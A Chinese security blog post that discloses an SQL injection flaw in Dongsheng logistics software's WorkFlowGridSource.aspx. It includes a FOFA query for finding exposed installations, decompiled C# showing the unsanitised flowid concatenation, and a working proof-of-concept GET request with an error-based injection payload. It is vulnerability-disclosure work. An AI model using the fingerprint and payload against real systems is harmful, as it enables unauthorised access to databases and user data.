---
title: "东胜物流软件 WorkFlowGridSource.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-WorkFlowGridSource-sqli.html
asset_dir: assets/东胜物流软件-workflowgridsource.aspx-sql注入漏洞
---

# 东胜物流软件 WorkFlowGridSource.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/23 12:27
- 728浏览
- [0评论](#comment)
- 21分钟阅读

深入探索

软件

木马

计算机安全

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WorkFlowGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL注入)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

漏洞扫描服务

网络安全课程

安全研究工具

根据 `WorkFlowGridSource.aspx` 的代码引用 `DSWeb.WorkFlow.WorkFlowGridSource` ，在dll中找到它的逻辑实现

```
protected void Page_Load(object sender, EventArgs e)
  {
    if (this.Session["USERID"] != null)
      this.strUserID = this.Session["USERID"].ToString();
    if (this.Request.QueryString["handle"] != null)
      this.strHandle = this.Request.QueryString["handle"].ToString();
    if (this.Request.QueryString["flowid"] != null)
      this.strWorkFlowID = this.Request.QueryString["flowid"].ToString();
......
    if (string.op_Equality(this.strHandle, "steplist") && this.strWorkFlowID != null)
      this.Response.Write(this.GetWorkFlowSteps(this.strWorkFlowID));
```

主要就是根据`handle`参数的值来进行处理不同的分支逻辑

SQL注入防护

当**`handle=steplist`**且`flowid`必须存在时，进入`GetWorkFlowSteps`方法

```
  public string GetWorkFlowSteps(string tempWorkFlowID)
  {
    DataTable table = new WorkFlowDA().GetDataSetBySql($"SELECT A.GID,A.STEPNO,A.NAME,A.DESCRIPTION,'查看条件',B.SHOWNAME as AUDITOR, CASE WHEN A.ISMUST = 1 THEN 1 ELSE 0 END as ISMUST, CASE WHEN A.ISLAST = 1 THEN 1 ELSE 0 END as ISLAST, CASE WHEN A.ISPARALLEL = 1 THEN 1 ELSE 0 END as ISPARALLEL,CASE WHEN A.ISDEPARTMENT = 1 THEN 1 ELSE 0 END as ISDEPARTMENT,(SELECT DEPTNAME FROM sys_dept WHERE GID = A.DEPARTMENTID) as DEPTNAME,  C.SHOWNAME as CREATEUSER, A.CREATETIME  FROM workflow_step as A LEFT JOIN [user] as B ON A.AUDITOR = B.GID LEFT JOIN [user] as C ON A.CREATEUSER = C.GID WHERE A.WORKFLOWID = '{tempWorkFlowID}' ORDER BY A.STEPNO ASC ").Tables[0];
    StringBuilder stringBuilder = new StringBuilder();
```

`tempWorkFlowID`参数（即`flowid`）的值被直接拼接在`GetDataSetBySql`语句里执行，全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

深入探索

传输层安全性协议

服务器安全服务

文件大小转换

```
GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid='-1/user-- HTTP/1.1
Host: dongsheng.mrxn.net
```

[![东胜物流软件 WorkFlowGridSource.aspx SQL注入漏洞](images/img-001-7491dd47376e.webp)](https://image.mrxn.net/1f3cc9f047754836a562a35b98dd551f.webp)

通过报错注入在响应里回显数据库版本信息。

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
